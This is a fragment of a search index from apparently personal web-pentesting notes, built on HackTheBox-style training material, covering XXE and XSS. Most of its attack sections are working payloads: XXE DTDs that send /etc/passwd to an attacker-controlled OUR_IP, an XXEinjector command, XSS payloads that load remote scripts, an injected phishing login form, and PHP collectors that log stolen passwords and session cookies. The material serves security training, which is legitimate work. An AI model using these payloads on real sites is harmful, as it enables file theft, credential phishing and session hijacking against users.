'%nonExistingEntity;/%file;'&gt;\"&gt;\n</code></pre> <p>Now, we can call our external DTD script, and then reference the error entity, as follows:</p> <pre><code>&lt;!DOCTYPE email [ \n  &lt;!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"&gt;\n  %remote;\n  %error;\n]&gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/XEE/#blind-data-exfiltration","title":"Blind Data Exfiltration","text":""},{"location":"zNew/Web/OWASP/XEE/#out-of-band-data-exfiltration","title":"Out-of-band Data Exfiltration","text":"<p>In our previous attacks, we utilized an out-of-band attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band). So, our attack this time will be pretty similar, with one significant difference. Instead of having the web application output our file entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.</p> <p>To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:</p> <pre><code>&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % oob \"&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;\"&gt;\n</code></pre> <p>We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:</p> <pre><code>&lt;?php\nif(isset($_GET['content'])){\n    error_log(\"\\n\\n\" . base64_decode($_GET['content']));\n}\n?&gt;\n</code></pre> <pre><code>$ php -S 0.0.0.0:80\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE email [ \n  &lt;!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"&gt;\n  %remote;\n  %oob;\n]&gt;\n&lt;root&gt;&amp;content;&lt;/root&gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/XEE/#automated-oob-exfiltration","title":"Automated OOB Exfiltration","text":"<p>Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is XXEinjector. This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.</p> <p>To use this tool for automated OOB exfiltration, we can first clone the tool to our machine, as follows:</p> <pre><code>$ git clone https://github.com/enjoiz/XXEinjector.git\n</code></pre> <p>Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool:</p> <p>Now, we can run the tool with the --host/--httpport flags being our IP and port, the --file flag being the file we wrote above, and the --path flag being the file we want to read. We will also select the --oob=http and --phpfilter flags to repeat the OOB attack we did above, as follows:</p> <pre><code>$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter\n</code></pre> <p>We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the Logs folder under the tool, and we can find our file there:</p>"},{"location":"zNew/Web/OWASP/XSS/","title":"Cross Site Scripting(XSS)","text":"<ul> <li>HackTricks</li> <li>PayloadsAllTheThings</li> <li>PayloadBox</li> </ul>"},{"location":"zNew/Web/OWASP/XSS/#dom","title":"DOM","text":"<p>This is a type of XSS attack where the vulnerability exists in the client-side code rather than the server-side code. The malicious script is embedded in the HTML page and is executed by the victim's browser when the page is loaded. This makes it more difficult to detect and prevent, as it does not involve the server at all. One good example is search bar.</p>"},{"location":"zNew/Web/OWASP/XSS/#reflected","title":"REFLECTED","text":"<p>In this type of attack, the malicious script is part of the victim's request to the website. The website includes this script in its response, which is then executed by the victim's web browser. Find some URL where it looks like ?q=something.</p>"},{"location":"zNew/Web/OWASP/XSS/#storedpersisted","title":"STORED/PERSISTED","text":"<p>In this type of attack, the malicious script is injected into a website's database. This script is then served to the website's users when they request it, leading to the execution of the script in their web browsers. An example of a stored XSS attack is when an attacker injects a comment containing malicious code on a website, and that code is served to other users who view the comment.</p> <ul> <li><code>&lt;iframe src=\\\"javascript:alert('xss')\\\"&gt;</code></li> <li><code>&lt;iframe src=\"javascript:alert('xss')\"&gt;</code></li> <li><code>&lt;iframe src='javascript:alert('xss')'&gt;</code></li> <li><code>&lt;script&gt;document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;');&lt;/script&gt;</code></li> <li><code>&lt;script&gt; var x = new XMLHttpRequest(); x.open(\"GET\", \"file:///etc/passwd\", true); x.onload = function(){ document.write(x.responseText); }; x.send(); &lt;/script&gt;</code> - Read File </li> </ul>"},{"location":"zNew/Web/OWASP/XSS/#stored-persistent","title":"Stored (Persistent)","text":"<p>XSS The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)</p>"},{"location":"zNew/Web/OWASP/XSS/#reflected_1","title":"Reflected","text":"<p>(Non-Persistent) XSS Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)</p>"},{"location":"zNew/Web/OWASP/XSS/#dom-based-xss","title":"DOM-based XSS","text":"<p>Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)</p>"},{"location":"zNew/Web/OWASP/XSS/#discovery","title":"Discovery","text":""},{"location":"zNew/Web/OWASP/XSS/#payloads","title":"Payloads","text":"<pre><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;\n&lt;plaintext&gt;\n&lt;script&gt;print()&lt;/script&gt;\n&lt;img src=\"\" onerror=alert(window.origin)&gt;\n&lt;iframe src=\\\"javascript:alert('xss')\\\"&gt;\n&lt;iframe src=\"javascript:alert('xss')\"&gt;\n&lt;iframe src='javascript:alert('xss')'&gt;\n&lt;script&gt;document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;');&lt;/script&gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/XSS/#defacing","title":"Defacing","text":"<p>One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. Defacing a website means changing its look for anyone who visits the website.</p>"},{"location":"zNew/Web/OWASP/XSS/#changing-background","title":"Changing Background","text":"<pre><code>&lt;script&gt;document.body.style.background = \"black\"&lt;/script&gt;\n&lt;script&gt;document.body.background = \"https://www.hackthebox.eu/images/logo-htb.svg\"&lt;/script&gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/XSS/#changing-page-title","title":"Changing Page Title","text":"<pre><code>&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/XSS/#changing-page-text","title":"Changing Page Text","text":"<pre><code>document.getElementById(\"todo\").innerHTML = \"New Text\"\ndocument.getElementsByTagName('body')[0].innerHTML = \"New Text\"\n\n&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = '&lt;center&gt;&lt;h1 style=\"color: white\"&gt;Cyber Security Training&lt;/h1&gt;&lt;p style=\"color: white\"&gt;by &lt;img src=\"https://academy.hackthebox.com/images/logo-htb.svg\" height=\"25px\" alt=\"HTB Academy\"&gt; &lt;/p&gt;&lt;/center&gt;'&lt;/script&gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/XSS/#phishing","title":"Phishing","text":""},{"location":"zNew/Web/OWASP/XSS/#login-form-injection","title":"Login Form Injection","text":"<p>Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.</p> <pre><code>&lt;h3&gt;Please login to continue&lt;/h3&gt;\n&lt;form action=http://OUR_IP&gt;\n    &lt;input type=\"username\" name=\"username\" placeholder=\"Username\"&gt;\n    &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt;\n    &lt;input type=\"submit\" name=\"submit\" value=\"Login\"&gt;\n&lt;/form&gt;\n</code></pre> <pre><code>document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=\"username\" name=\"username\" placeholder=\"Username\"&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Login\"&gt;&lt;/form&gt;');\n</code></pre>"},{"location":"zNew/Web/OWASP/XSS/#cleaning-up","title":"Cleaning Up","text":"<pre><code>document.getElementById('urlform').remove();\n</code></pre> <pre><code>document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=\"username\" name=\"username\" placeholder=\"Username\"&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Login\"&gt;&lt;/form&gt;');\ndocument.getElementById('urlform').remove();\n</code></pre> <p>We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:</p> <pre><code>...PAYLOAD... &lt;!-- \n</code></pre>"},{"location":"zNew/Web/OWASP/XSS/#credential-stealing","title":"Credential Stealing","text":"<p>So, let us start a simple netcat server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:</p> <pre><code>$ sudo nc -lvnp 80\n</code></pre> <p>However, as we are only listening with a netcat listener, it will not handle the HTTP request correctly, and the victim would get an Unable to connect error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.</p> <p>The following PHP script should do what we need, and we will write it to a file on our VM that we'll call index.php and place it in /tmp/tmpserver/</p> <pre><code>&lt;?php\nif (isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {\n    $file = fopen(\"creds.txt\", \"a+\");\n    fputs($file, \"Username: {$_GET['username']} | Password: {$_GET['password']}\\n\");\n    header(\"Location: http://SERVER_IP/phishing/index.php\");\n    fclose($file);\n    exit();\n}\n?&gt;\n</code></pre> <p>Now that we have our index.php file ready, we can start a PHP listening server, which we can use instead of the basic netcat listener we used earlier:</p> <pre><code>$ mkdir /tmp/tmpserver\n$ cd /tmp/tmpserver\n$ vi index.php #at this step we wrote our index.php file\n$ sudo php -S 0.0.0.0:80\n</code></pre>"},{"location":"zNew/Web/OWASP/XSS/#session-hijacking","title":"Session Hijacking","text":"<p>Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. However, if a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.</p> <p>With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a Session Hijacking (aka Cookie Stealing) attack.</p>"},{"location":"zNew/Web/OWASP/XSS/#blind-xss-detection","title":"Blind XSS Detection","text":"<p>We usually start XSS attacks by trying to discover if and where an XSS vulnerability exists. A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.</p> <p>Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:</p> <ul> <li>Contact Forms</li> <li>Reviews</li> <li>User Details</li> <li>Support Tickets</li> <li>HTTP User-Agent header</li> </ul> <pre><code>&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\n'&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\n\"&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\njavascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://OUR_IP\\';document.body.appendChild(a)')\n&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//OUR_IP\");a.send();&lt;/script&gt;\n&lt;script&gt;$.getScript(\"http://OUR_IP\")&lt;/script&gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/XSS/#loading-a-remote-script","title":"Loading a Remote Script","text":"<p>So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script.</p> <p>If we get a request for /username, then we know that the username field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request. The following are a few examples we can use from PayloadsAllTheThings</p> <p>Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP, as mentioned earlier.</p>"},{"location":"zNew/Web/OWASP/XSS/#session-hijacking_1","title":"Session Hijacking","text":"<p>Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.</p> <p>A session hijacking attack is very similar to the phishing attack we performed in the previous section. It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.</p> <p>There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by PayloadsAllTheThings: We can write any of these JavaScript payloads to script.js, which will be hosted on our VM as well:</p> <p>Now, we can change the URL in the XSS payload we found earlier to use script.js (don't forget to replace OUR_IP with your VM IP in the JS script and the XSS payload):</p> <p>With our PHP server running, we can now use the code as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. However, if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.</p> <pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $list = explode(\";\", $_GET['c']);\n    foreach ($list as $key =&gt; $value) {\n        $cookie = urldecode($value);\n        $file = fopen(\"cookies.txt\", \"a+\");\n        fputs($file, \"Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\\n\");\n        fclose($file);\n    }\n}\n?&gt;\n</code></pre> <p>Now, we wait for the victim to visit the vulnerable page and view our XSS payload. Once they do, we will get two requests on our server, one for script.js, which in turn will make another request with the cookie value:</p> <p>Finally, we can use this cookie on the login.php page to access the victim's account. To do so, once we navigate to /hijacking/login.php, we can click Shift+F9 in Firefox to reveal the Storage bar in the Developer Tools. Then, we can click on the + button on the top right corner and add our cookie, where the Name is the part before = and the Value is the part after = from our stolen cookie:</p> <p>Once we set our cookie, we can refresh the page and we will get access as the victim.</p>"}]}